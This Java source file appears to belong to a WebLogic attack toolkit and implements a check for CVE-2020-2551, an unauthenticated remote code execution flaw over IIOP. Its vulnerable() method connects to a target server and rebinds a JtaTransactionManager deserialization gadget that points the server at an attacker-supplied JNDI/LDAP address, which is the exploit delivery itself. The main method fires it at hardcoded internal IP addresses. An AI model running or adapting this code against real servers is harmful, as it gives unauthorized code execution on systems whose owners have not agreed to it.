package com.r4v3zn.weblogic.tools.payloads.impl;

import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.annotation.Dependencies;
import com.r4v3zn.weblogic.tools.annotation.Tags;
import com.r4v3zn.weblogic.tools.annotation.Versions;
import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
import com.r4v3zn.weblogic.tools.payloads.VulTest;
import javassist.*;
import lombok.extern.log4j.Log4j2;
import javax.naming.Context;
import javax.naming.InitialContext;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;

import static com.r4v3zn.weblogic.tools.translator.MyTranslator.IIOP_SOCKET_CLASS_NAME;
import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: CVE_2020_2551
 * Descrption:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN,Authors.LUFEI})
@Dependencies({":JtaTransactionManager"})
@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
@Tags({"Nday"})
@Log4j2
public class CVE_2020_2551 implements VulTest {
    private static final String POC_NAME = "com.bea.core.repackaged.springframework.spring.jar";
    private static final String POC_LOG = "com.bea.core.repackaged.apache.commons.logging.jar";
    private static final String FULL_CLIENT = "wlfullclient.jar";

    /**
     * 漏洞影响版本
     */
    public static final List<String> VUL_VERSIONS = new ArrayList<String>(){{
        add("10.3.6.0");
        add("10.3.6.0.0");
        add("12.1.3.0");
        add("12.1.3.0.0");
        add("12.2.1.3.0");
        add("12.2.1.3.0.0");
        add("12.2.1.4.0");
        add("12.2.1.4.0.0");
    }};

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param ip ip
     * @param port 端口
     * @return 漏洞存在返回 true 否则返回 false
     */
    @Override
    public Boolean vulnerable(String ip, Integer port,String... param) throws Exception{
        // weblogic version
        String version = getVersion(ip, port);
        System.out.println("[*] weblogic version --> "+version);
        if(isBlank(version) || !VUL_VERSIONS.contains(version)){
            return false;
        }
        URLClassLoader urlClassLoader = null;
        try{
            urlClassLoader = loadClass(version);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        String jndiUrl = "balabalabala://127.0.0.1:6789/Exploit";
        if(param.length > 0){
            jndiUrl = param[0];
        }
        Hashtable<String, String> env = new Hashtable<>();
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
        Context context = null;
        try {
            context = new InitialContext(env);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
        JtaTransactionManagerGadget payload = new JtaTransactionManagerGadget();
        Object object = null;
        try {
            object = payload.getObject(jndiUrl,urlClassLoader);
        } catch (Exception e) {
            urlClassLoader.close();
            return false;
        }
        try{
            context.rebind("hello",object);
        }catch (Exception e){
            String msg = e.getMessage();
            if("Unhandled exception in rebind()".equals(msg)){
                urlClassLoader.close();
                return true;
            }else{
                urlClassLoader.close();
                return false;
            }
        }
        urlClassLoader.close();
        System.gc();
        return false;
    }

    /**
     * 加载 class loader
     * @param version
     * @throws Exception
     */
    public URLClassLoader loadClass(String version) throws Exception {
        System.out.println("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
        String path = this.getClass().getResource("/lib/").getPath();
        String pocNamePath = path +"12.2.1.3.0/" + POC_NAME;
        String pocLogPath = path +"12.2.1.3.0/" + POC_LOG;
        String fullClientPath = path + FULL_CLIENT;
        if(version.contains("10.3.6") || version.contains("12.1.3")){
            pocNamePath = path + "10.3.6.0/" + POC_NAME;
            pocLogPath = path + "10.3.6.0/" + POC_LOG;
        }
        System.out.println("[*] jat path --> "+pocNamePath);
        System.out.println("[*] jat log path --> "+pocLogPath);
        URL[] urls = new URL[]{new URL("file:"+pocNamePath), new URL("file:"+pocLogPath), new URL("file:"+fullClientPath)};
        return new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
    }

    /**
     * 漏洞利用
     * @param ip ip
     * @param port 端口
     * @throws Exception 抛出异常
     */
    @Override
    public String exploit(String ip, Integer port, String... param) throws Exception {
        // no
        return null;
    }

    public static void main(String[] args) throws Exception {
        CVE_2020_2551 vul = new CVE_2020_2551();
        String jdnUrl = "ldap://192.168.1.6:1099/poc";
//        jdnUrl = "ldap://10.10.10.172:1099/poc";
//        System.out.println(vul.vulnerable("10.10.10.172", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.168", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.173", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.162", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));

        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
    }
}
